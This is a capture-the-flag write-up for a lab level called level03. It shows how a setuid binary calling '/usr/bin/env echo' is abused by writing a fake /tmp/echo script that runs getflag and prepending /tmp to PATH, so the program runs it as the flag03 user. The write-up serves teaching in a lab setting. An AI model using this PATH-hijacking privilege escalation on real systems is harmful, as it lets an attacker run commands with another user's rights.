# Level03
## Step by step
- In the user `level03` home directory, there is a file
  ```bash
  > ls -la
  -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
  ```
- The file `level03` is an executable with `s` permission, that means, that the program will be run by the owner of the file, in this case `flag03`
- When we execute the binary it print something
  ```bash
  > ./level03
   Exploit me
  ```
- With the command `strings` we can get all the printable characters sequences that are at least 4 characters long
  ```bash
  > strings level03
  /lib/ld-linux.so.2
  KT{K
  __gmon_start__
  libc.so.6
  _IO_stdin_used
  setresgid
  setresuid
  system
  getegid
  geteuid
  __libc_start_main
  GLIBC_2.0
  PTRh
  UWVS
  [^_]
  /usr/bin/env echo Exploit me
  ;*2$"
  GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
  /home/user/level03
  /usr/include/i386-linux-gnu/bits
  /usr/include/i386-linux-gnu/sys
  level03.c
  ...
  ```
- The binary use `echo` to print `Exploit me`, but we can change the binary it use to execute `getflag` as the `flag03` user
  ```bash
  >  cat <<hey >/tmp/echo
  > #!/bin/bash
  > getflag
  > hey

  > export PATH=/tmp:$PATH

  > ./level03 
  Check flag.Here is your token : XXX
  ```

  
